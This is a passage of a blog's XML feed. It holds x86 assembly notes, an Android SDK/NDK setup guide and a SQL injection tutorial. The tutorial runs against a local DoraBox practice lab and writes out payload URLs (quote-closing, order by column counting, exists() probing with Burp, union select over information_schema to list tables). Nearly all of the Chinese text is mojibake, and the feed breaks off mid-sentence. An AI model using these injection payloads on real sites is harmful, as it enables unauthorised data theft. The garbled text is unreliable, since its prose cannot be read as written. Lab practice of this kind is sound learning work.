ç›¸å½“äºï¼š"><a href="#push-espä»£ç ç›¸å½“äºï¼š" class="headerlink" title="push espä»£ç ç›¸å½“äºï¼š"></a>push espä»£ç ç›¸å½“äºï¼š</h5><p><code>mov dword ptr [esp-4],esp sub esp,0x4</code><br> è¿˜æœ‰ï¼š</p><p> <code>mov dword ptr [esp-4],esp  lea esp,dword ptr [esp-4]</code></p><h5 id="pop-eax-ä»£ç ç›¸å½“äºï¼š"><a href="#pop-eax-ä»£ç ç›¸å½“äºï¼š" class="headerlink" title="pop eax ä»£ç ç›¸å½“äºï¼š"></a>pop eax ä»£ç ç›¸å½“äºï¼š</h5><p><code>lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4]</code></p><p><code>mov eax,dword ptr [esp] lea esp,dword ptr [esp+4]</code></p><h5 id="pop-esp-ä»£ç ç›¸å½“äºï¼š"><a href="#pop-esp-ä»£ç ç›¸å½“äºï¼š" class="headerlink" title="pop esp ä»£ç ç›¸å½“äºï¼š"></a>pop esp ä»£ç ç›¸å½“äºï¼š</h5><p><code>add esp,0x4 mov esp,dword ptr[esp-4]</code><br>æˆ–è€…</p><p><code>lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4]</code></p><h4 id="ä¸¤æ¡ç®€å•æŒ‡ä»¤"><a href="#ä¸¤æ¡ç®€å•æŒ‡ä»¤" class="headerlink" title="ä¸¤æ¡ç®€å•æŒ‡ä»¤"></a>ä¸¤æ¡ç®€å•æŒ‡ä»¤</h4><p>stos ï¼šå°†eaxä¸­çš„å€¼æ”¾å…¥ediæ‰€æŒ‡åœ°å€çš„å†…å­˜é‡Œã€‚</p><p>rep ï¼šæ˜¯é‡å¤æŒ‡ä»¤ ecxä¸­æ”¾å…¥é‡å¤çš„æ¬¡æ•°</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º</title>
    <link href="/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>#å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º</p><h2 id="Macä¸‹å®‰å“SDKæ­å»ºï¼š"><a href="#Macä¸‹å®‰å“SDKæ­å»ºï¼š" class="headerlink" title="Macä¸‹å®‰å“SDKæ­å»ºï¼š"></a>Macä¸‹å®‰å“SDKæ­å»ºï¼š</h2><p>å‰ææ˜¯å·²ç»å®‰è£…äº†<strong>homebrew</strong>ç¥å™¨ï¼š</p><h3 id="1ï¼šä¸‹è½½SDK"><a href="#1ï¼šä¸‹è½½SDK" class="headerlink" title="1ï¼šä¸‹è½½SDK"></a>1ï¼šä¸‹è½½SDK</h3><pre><code>brew search android-sdkbrew cask install android-sdk</code></pre><h3 id="2ï¼šé…ç½®ç¯å¢ƒå˜é‡"><a href="#2ï¼šé…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="2ï¼šé…ç½®ç¯å¢ƒå˜é‡"></a>2ï¼šé…ç½®ç¯å¢ƒå˜é‡</h3><pre><code>vim .zshrcexport ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot;export PATH=&quot;${PATH}:${ANDROID_SDK_ROOT}/tools:${ANDROID_SDK_ROOT}/platform-tools&quot;</code></pre><p><code>!wq</code>é€€å‡ºä»¥åï¼Œ<code>source ~/.zshrc</code></p><pre><code>pwd/usr/local/share/android-sdk/tools/bin./sdkmanager</code></pre><p>ç„¶åä¼šå‡ºç°<code>Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.</code><br>ç»§ç»­<code>touch /Users/gjy/.android/repositories.cfg</code></p><h3 id="3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½"><a href="#3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½" class="headerlink" title="3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½"></a>3ï¼šæ£€éªŒæ˜¯å¦æ­å»ºå¥½</h3><p>åœ¨ç»ˆç«¯è¾“å…¥ï¼š<code>android</code><br><img src="/2019/09/23/å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º/images/15692314399452.jpg" srcset="/img/loading.gif" alt="-w706"><br>è¿™å°±okäº†ã€‚</p><h2 id="å®‰å“NDKæ­å»º"><a href="#å®‰å“NDKæ­å»º" class="headerlink" title="å®‰å“NDKæ­å»º"></a>å®‰å“NDKæ­å»º</h2><p>å‰ææ˜¯å·²ç»å®‰è£…äº†<strong>homebrew</strong>ç¥å™¨ï¼š</p><h3 id="1ï¼šä¸‹è½½NDKï¼š"><a href="#1ï¼šä¸‹è½½NDKï¼š" class="headerlink" title="1ï¼šä¸‹è½½NDKï¼š"></a>1ï¼šä¸‹è½½NDKï¼š</h3><pre><code>brew search android-ndkbrew cask install android-ndk</code></pre><h3 id="2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š"><a href="#2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š" class="headerlink" title="2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š"></a>2ï¼šé…ç½®ç¯å¢ƒå˜é‡ï¼š</h3><pre><code>vim .zshrcexport ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot;  //æ·»åŠ è¿›å»æ­£å¸¸ä¿å­˜é€€å‡ºsource .zshrc</code></pre><h3 id="3ï¼šæ£€éªŒï¼š"><a href="#3ï¼šæ£€éªŒï¼š" class="headerlink" title="3ï¼šæ£€éªŒï¼š"></a>3ï¼šæ£€éªŒï¼š</h3><p><code>ndk-build</code><br><img src="/2019/09/23/å®‰å“ç¨‹åºåˆ†æç¯å¢ƒæ­å»º/images/15692340400478.jpg" srcset="/img/loading.gif" alt="-w751"><br>å·²ç»æˆåŠŸäº†ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥åŸºç¡€å­¦ä¹ </title>
    <link href="/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥åŸºç¡€å­¦ä¹ "><a href="#SQLæ³¨å…¥åŸºç¡€å­¦ä¹ " class="headerlink" title="SQLæ³¨å…¥åŸºç¡€å­¦ä¹ "></a>SQLæ³¨å…¥åŸºç¡€å­¦ä¹ </h1><h2 id="æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰"><a href="#æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰" class="headerlink" title="æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰"></a>æ•°æ®ç±»å‹ï¼ˆæ•°å­—å‹ï¼‰</h2><h3 id="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ"><a href="#æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ" class="headerlink" title="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ"></a>æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ</h3><h4 id="ä½¿ç”¨and-or-xor-likeæµ‹è¯•"><a href="#ä½¿ç”¨and-or-xor-likeæµ‹è¯•" class="headerlink" title="ä½¿ç”¨and,or,xor,likeæµ‹è¯•"></a>ä½¿ç”¨<code>and,or,xor,like</code>æµ‹è¯•</h4><ul><li>** 1=1</li><li>** 1=2<br>å…¶ä¸­<code>**</code>å¯ä»¥ä¸º<code>and or xor like</code>ä»»æ„ä¸€ä¸ªpsï¼šåŸºæœ¬è¯­å¥ï¼Œæ³¨æ„çœŸå‡é€»è¾‘å…³ç³»ï¼Œçµæ´»è¿›è¡Œæµ‹è¯•ã€‚</li></ul><h4 id="ä½¿ç”¨ç¬¦å·æµ‹è¯•"><a href="#ä½¿ç”¨ç¬¦å·æµ‹è¯•" class="headerlink" title="ä½¿ç”¨ç¬¦å·æµ‹è¯•"></a>ä½¿ç”¨ç¬¦å·æµ‹è¯•</h4><ul><li>å•å¼•å·</li><li>å‡å·</li></ul><h2 id="æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰"><a href="#æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰" class="headerlink" title="æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰"></a>æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦å‹ï¼‰</h2><h3 id="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ-1"><a href="#æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ-1" class="headerlink" title="æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ"></a>æ£€æµ‹æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ‰§è¡Œ</h3><p>æ­¤å¤„è·Ÿæ•°å­—å‹æµ‹è¯•åŠæ³•åŸºæœ¬ä¸€æ ·ï¼Œè¿˜æ˜¯ä½¿ç”¨<code>and,or,xor,like</code>ã€<code>å•å¼•å·</code>æµ‹è¯•ã€‚æœ€è¿‘æ¥è§¦å­—ç¬¦å‹çš„æ³¨å…¥è¾ƒå°‘ï¼Œè¡¥å……ä¸€ä¸‹åŸç†ï¼š</p><p>æˆ‘ä»¬å…ˆè¿›è¡Œæ­£å¸¸æŸ¥è¯¢ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit</code><br>å½“æˆ‘ä»¬ç»™æ¥å—å¤„åŠ <code>&#39;</code>ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit</code>è¯­å¥æ‰§è¡Œåï¼Œä¼šäº§ç”ŸæŠ¥é”™ï¼š<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673389579474.jpg" srcset="/img/loading.gif" alt><br>ç„¶åæˆ‘ä»¬æƒ³åŠæ³•ä¸è®©å…¶æŠ¥é”™ï¼Œå°±æ˜¯æ¥çœç•¥åé¢é‚£ä¸ªphpä»£ç è¯­å¥åŠ çš„<code>&#39;</code>:</p><ol><li>ç”¨<code>#</code>æ¥æ³¨é‡Šï¼Œä½†éœ€è¦è¿›è¡Œurlæ¥è½¬å˜ä¸€ä¸‹ä¸º<code>%23</code></li><li>ç”¨<code>--+</code> <code>--%20</code>æ¥æ³¨é‡Š<br>ç„¶åå°±å¯ä»¥æ¥ç”¨<code>and or xor like</code>æ¥æµ‹è¯•äº†ï¼Œä¾‹å¦‚ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673394738908.jpg" srcset="/img/loading.gif" alt><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673394874987.jpg" srcset="/img/loading.gif" alt></li></ol><h3 id="unionçŸ¥è¯†å°è®°"><a href="#unionçŸ¥è¯†å°è®°" class="headerlink" title="unionçŸ¥è¯†å°è®°"></a>unionçŸ¥è¯†å°è®°</h3><p>unionåœ¨é›†åˆä¸¤ä¸ªselectæŸ¥è¯¢è¯­å¥æ—¶ï¼Œä¸€å®šè¦æ³¨æ„<strong>ä¸¤ä¸ªæŸ¥è¯¢å‡ºæ¥çš„ç»“æœ,åˆ—æ•°ï¼ˆcolumnsï¼‰è¦ç›¸ç­‰æ‰ä¼šå‡ºæ¥ç»“æœã€‚</strong><br>ä¾‹å¦‚ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673411551995.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * from news union SELECT 1,2;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673412010749.jpg" srcset="/img/loading.gif" alt><br>æŠ¥é”™ï¼Œæ¢æˆ<code>SELECT * from news union SELECT 1,2,3;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673412472041.jpg" srcset="/img/loading.gif" alt></p><h3 id="order-by-çŸ¥è¯†å°è®°"><a href="#order-by-çŸ¥è¯†å°è®°" class="headerlink" title="order by çŸ¥è¯†å°è®°"></a>order by çŸ¥è¯†å°è®°</h3><p><code>order by</code>æ˜¯æŒ‰ç…§ä¸€å®šè§„åˆ™æ¥è¿›è¡Œæ’åºçš„è¯­å¥ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€šè¿‡<code>order by</code>æ’åºï¼Œæ¥æ’å‡ºæ¥åˆ—åæœ‰å¤šå°‘ä¸ªå‘¢ï¼Ÿæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673428181899.jpg" srcset="/img/loading.gif" alt></p><p><code>SELECT * from test ORDER BY 1;</code><br>å½“æˆ‘ä»¬åœ¨æµ‹è¯•åˆ°<code>SELECT * from test ORDER BY 5;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673428766361.jpg" srcset="/img/loading.gif" alt><br>å‘ç°å‡ºäº†å¼‚å¸¸ã€‚<br>æˆ‘ä»¬æ¢ä¸ª3åˆ—çš„è¡¨ï¼š<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673429298587.jpg" srcset="/img/loading.gif" alt><br>`SELECT * from news<br>ORDER BY 3;`æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„<br>`SELECT * from news<br>ORDER BY 4;`<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673429733420.jpg" srcset="/img/loading.gif" alt><br>æ‰€ä»¥å¯ä»¥<strong>å‘ç°æˆ‘ä»¬åœ¨<code>order by</code>ååŠ æ•°å­—å¯ä»¥æ¥æµ‹å‡ºæ¥ä¸€ä¸ªè¡¨çš„åˆ—åä¸ªæ•°ã€‚</strong></p><h3 id="æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ"><a href="#æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ" class="headerlink" title="æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ"></a>æ˜¾ç¤ºè”åˆæŸ¥è¯¢å‡ºç°çš„ç»“æœ</h3><p>æ˜¾ç¤ºæˆ‘ä»¬è‡ªå®šä¹‰æŸ¥è¯¢çš„ç»“æœï¼Œè¯¥æ€ä¹ˆå®ç°å‘¢ã€‚<br>å…ˆåœ¨é¶åœºæµ‹è¯•ï¼š<code>SELECT * FROM news WHERE id = 2 union select 1,2,3 from test</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673503130693.jpg" srcset="/img/loading.gif" alt></p><p>æ˜æ˜¾ç½‘é¡µæ˜¯ä¸ç»™æ˜¾ç¤ºçš„ã€‚ç›¸åŒè¯­å¥åœ¨æ•°æ®åº“ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673494870032.jpg" srcset="/img/loading.gif" alt><br>ä¸ç»™æ˜¾ç¤ºæ˜¯å› ä¸ºæœåŠ¡å™¨ç«¯phpä»£ç è¿›è¡Œäº†å¤„ç†ï¼Œåªå¯ä»¥æ˜¾ç¤ºå‡ºä¸€æ¡ç»“æœã€‚é‚£å¦‚æœæŠŠç¬¬ä¸€ä¸ªæŸ¥è¯¢ç»“æœç»™æ— æ³•æ˜¾ç¤ºï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬è”åˆæŸ¥è¯¢çš„ç»“æœå‘¢ã€‚å…ˆåœ¨æ•°æ®åº“æµ‹è¯•ä¸‹SQLè¯­å¥ï¼š<code>SELECT * FROM news WHERE id = -1</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673498250797.jpg" srcset="/img/loading.gif" alt="-w430"><br>å‘ç°æ˜¯ä¸æ˜¾ç¤ºä¸œè¥¿çš„ã€‚ç»§ç»­æµ‹è¯•:<code>SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673498938620.jpg" srcset="/img/loading.gif" alt><br>æ¥ç€æˆ‘ä»¬æ‹¿åˆ°é¶åœºæµ‹è¯•ï¼š<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673503981645.jpg" srcset="/img/loading.gif" alt></p><p>è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚çœ‹è¿™ä¸ªé¡µé¢æ˜¾ç¤ºçš„æ•ˆæœ<code>2 3</code>ï¼Œåå‘æ€ç»´è€ƒè™‘æŠŠ<code>2 3</code>æ”¹æˆæˆ‘ä»¬çš„åˆ—åæ˜¯ä¸æ˜¯å°±å¯ä»¥å‡ºæ•°æ®äº†ï¼Œ<strong>ä½†æ˜¯æˆ‘ä»¬å¦‚ä½•çŸ¥é“è¡¨é‡Œçš„åˆ—åå‘¢ï¼Ÿ</strong></p><h3 id="existsï¼ˆï¼‰å‡½æ•°å°è®°"><a href="#existsï¼ˆï¼‰å‡½æ•°å°è®°" class="headerlink" title="existsï¼ˆï¼‰å‡½æ•°å°è®°"></a>existsï¼ˆï¼‰å‡½æ•°å°è®°</h3><p><code>exists()</code>æ˜¯éªŒè¯æŸä¸ªè¯­å¥æ˜¯å¦å­˜åœ¨ç»“æœï¼Œæ˜¯ä¸ªboolå‡½æ•°ï¼Œå­˜åœ¨æ˜¾ç¤º<code>1</code>åä¹‹æ˜¯<code>0</code>ã€‚<br><code>SELECT * FROM news WHERE id=1 and exists(select * from test);</code>åœ¨æ•°æ®åº“è¿›è¡Œæµ‹è¯•:<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673529496971.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * FROM news WHERE id=1 and exists(select * from aa);</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673532051506.jpg" srcset="/img/loading.gif" alt><br>å‘ç°åœ¨ç”¨è¿™ä¸ªå‡½æ•°æŸ¥<strong>ä¸å­˜åœ¨çš„è¡¨</strong>çš„æ—¶å€™è¯­å¥æ˜¯æ²¡æ³•è¿›è¡Œçš„ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªè¯­å¥æ¥æ¨å‡ºè¡¨åå’Œåˆ—åï¼Œä¸è¿‡ååˆ†éº»çƒ¦ï¼Œ<strong>å¯ä»¥é€šè¿‡burpsuitæ¥è·‘</strong>ã€‚è¿˜æœ‰æ„å¤–æ”¶è·ï¼Œå¯ä»¥çœ‹å‡ºæ•°æ®åº“çš„åå­—<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15673536538274.jpg" srcset="/img/loading.gif" alt><br>pentestå°±æ˜¯æ•°æ®åº“çš„åå­—äº†ã€‚</p><h2 id="æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰"><a href="#æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰" class="headerlink" title="æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰"></a>æ•°æ®ç±»å‹ï¼ˆæœç´¢å‹ï¼‰</h2><h3 id="çš„ä½œç”¨"><a href="#çš„ä½œç”¨" class="headerlink" title="%çš„ä½œç”¨"></a><code>%</code>çš„ä½œç”¨</h3><p><code>%</code>åœ¨mysqlä¸­è¡¨ç¤ºé€šé…ç¬¦ã€‚åœ¨SQLè¯­å¥ä¸­:<br><code>******* like &#39;%a&#39;</code>ï¼Œå°±æ˜¯æœç´¢è¿”å›ä»¥å­—æ¯<code>a</code>ç»“å°¾çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒç†<code>a%</code>%a%`<code>,åˆ†åˆ«å°±æ˜¯ æœç´¢è¿”å›ä»¥å­—æ¯</code>a<code>å¼€å¤´çš„æ‰€æœ‰ä¿¡æ¯å’Œæœç´¢è¿”å›åŒ…å«å­—æ¯</code>a`çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><h3 id="å¦‚ä½•æ³¨å…¥"><a href="#å¦‚ä½•æ³¨å…¥" class="headerlink" title="å¦‚ä½•æ³¨å…¥"></a>å¦‚ä½•æ³¨å…¥</h3><p>å’±ä»¬å…ˆçœ‹ä¸‹phpæºä»£ç :<code>$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search</code><br>å¾ˆæ˜æ˜¾æå‰é—­åˆ<code>&#39;%</code>è·Ÿçœç•¥åé¢çš„<code>%&#39;</code>å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679129656049.jpg" srcset="/img/loading.gif" alt="-w804"></p><p>ç„¶åæˆ‘ä»¬æ­£å¸¸èµ°æ­¥éª¤ï¼Œåˆ©ç”¨<code>order by</code>æ¥ç¡®å®šä¸‹å¤šå°‘åˆ—ï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679138962766.jpg" srcset="/img/loading.gif" alt="-w840"><br>ç»§ç»­<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679139214321.jpg" srcset="/img/loading.gif" alt="-w1022"><br>å¯ä»¥ç¡®å®šæ˜¯3åˆ—äº†ã€‚</p><p>ç„¶åå¼€å§‹ç¡®å®šè¡¨åï¼Œè¿™æ¬¡ç”¨åˆšåˆšå­¦çš„exist()æ¥æµ‹è¯•ï¼Œå¹¶ä¸”ç»ƒä¹ ä¸€ä¸‹burpæ¥è·‘è¡¨åå’Œåˆ—åï¼š<br>å…ˆæ­£å¸¸æ„é€ payloadï¼š<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679141526795.jpg" srcset="/img/loading.gif" alt="-w843"><br>ç¡®å®šnewsè¡¨åå­˜åœ¨ï¼Œç„¶åå¼€å§‹ç”¨burpè·‘å…¶ä»–çš„ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679142504637.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679143681990.jpg" srcset="/img/loading.gif" alt="-w837"><br>æˆ‘ä»¬æ˜¯è·‘è¡¨åï¼Œæ‰€ä»¥åœ¨<code>news</code>åŠ ä¸Šå˜é‡ã€‚è¿™ä¸ªæ­¥éª¤éœ€è¦å…ˆç‚¹<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679145034217.jpg" srcset="/img/loading.gif" alt="-w371"><br>ç„¶å<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679144276086.jpg" srcset="/img/loading.gif" alt="-w364"><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679145997135.jpg" srcset="/img/loading.gif" alt="-w531"><br>åœ¨â€œæ·»åŠ â€œæŒ‰é’®æ—çš„ä½ç½®å¼€å§‹å¡«å…¥æµ‹è¯•çš„è¡¨åï¼Œè¿™ä¸ªæˆ‘æ˜¯æ‰‹åŠ¨å¡«çš„ï¼Œå¯ä»¥è¿›è¡Œå¯¼å…¥å­—å…¸ã€‚<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679146928775.jpg" srcset="/img/loading.gif" alt="-w1260"><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679147050548.jpg" srcset="/img/loading.gif" alt="-w778"><br>ç„¶åæˆ‘ä»¬å¼€å§‹çœ‹ç»“æœ<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679147687971.jpg" srcset="/img/loading.gif" alt="-w666"><br><code>Render</code>ä¸‹é¢æ˜¾ç¤ºæ­£å¸¸å°±è¯æ˜æ˜¯å­˜åœ¨çš„ã€‚<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679148321357.jpg" srcset="/img/loading.gif" alt="-w963"><br>è¿™ä¸ªæ˜¯ä¸å­˜åœ¨ã€‚æœ€ç»ˆç”¨è¿™ä¸ªåŠæ³•å¯ä»¥è·‘å‡ºè¡¨å<code>testã€account</code>ã€‚åŒæ ·åŠæ³•è·‘åˆ—åï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679152029822.jpg" srcset="/img/loading.gif" alt="-w665"></p><p><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679151626020.jpg" srcset="/img/loading.gif" alt="-w797"><br>ç¡®å®šå‡º<code>news</code>è¡¨ä¸­æœ‰<code>idã€titleã€content</code>ç­‰åˆ—ã€‚</p><p>ç„¶åæˆ‘ä»¬æ›´æ–°ä¸‹è¯­å¥æ¥æŸ¥è¡¨å’Œåˆ—ï¼Œ<code>exists()</code>è¿™ä¸ªåŠæ³•æ˜¯æœ‰ç‚¹è€çš„æ¯”è¾ƒç¬¨ã€‚<strong>åœ¨MySQL&gt;5.1ç‰ˆæœ¬ä¸­</strong>ï¼Œ<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679322405278.jpg" srcset="/img/loading.gif" alt="-w764"><br>æˆ‘ä»¬å¯ä»¥åœ¨<code>information_schema</code>å‘ç°è¿™ä¸ªæˆ‘ä»¬çš„æ•°æ®åº“å’Œåˆ—åéƒ½å¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»¥ä¸‹è¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼š<br>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å…ˆè®©å…¶å¯ä»¥æ˜¾ç¤ºæˆ‘ä»¬æƒ³æŸ¥è¯¢çš„å†…å®¹<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679326036385.jpg" srcset="/img/loading.gif" alt="-w904"><br>æŠŠæ ‡é¢˜ä¸‹çš„<code>2</code>æ¢æˆ<code>darabase()</code>å‡½æ•°ï¼Œæ¥æ˜¾ç¤ºä¸‹æ•°æ®åº“çš„åå­—ã€‚<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679327628086.jpg" srcset="/img/loading.gif" alt="-w982"><br>ç„¶åæˆ‘ä»¬å°±çš„å¾—åˆ°äº†<code>pentest</code>ï¼Œç„¶åå¼€å§‹åˆ©ç”¨è¿™ä¸ªmysql&gt;5.1ç‰¹æ€§æ¥æ„é€ è¯­å¥ï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679330638311.jpg" srcset="/img/loading.gif" alt="-w902"><br>ä½†æ˜¯åœ¨è¿™é‡Œé¢æ€ä¹ˆæ˜¾ç¤ºå…¶ä»–çš„åå­—å‘¢ï¼Ÿ<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679331040602.jpg" srcset="/img/loading.gif" alt="-w523"><br>ç»§ç»­:<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit</code>å…¶ä¸­å¯ä»¥å°†<code>!=</code>æ¢æˆ<code>&lt;&gt;</code>æ˜¯åŒæ ·çš„æ•ˆæœã€‚<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679332502596.jpg" srcset="/img/loading.gif" alt="-w916"><br>ç»§ç»­åœ¨è¯­å¥ä¸­åŠ <code>andå’Œä¸ç­‰äºå‰é¢æŸ¥å‡ºçš„è¡¨çš„åå­—</code>ï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679333657212.jpg" srcset="/img/loading.gif" alt="-w989"><br><strong>æˆ‘ä»¬å‘ç°è¿™æ 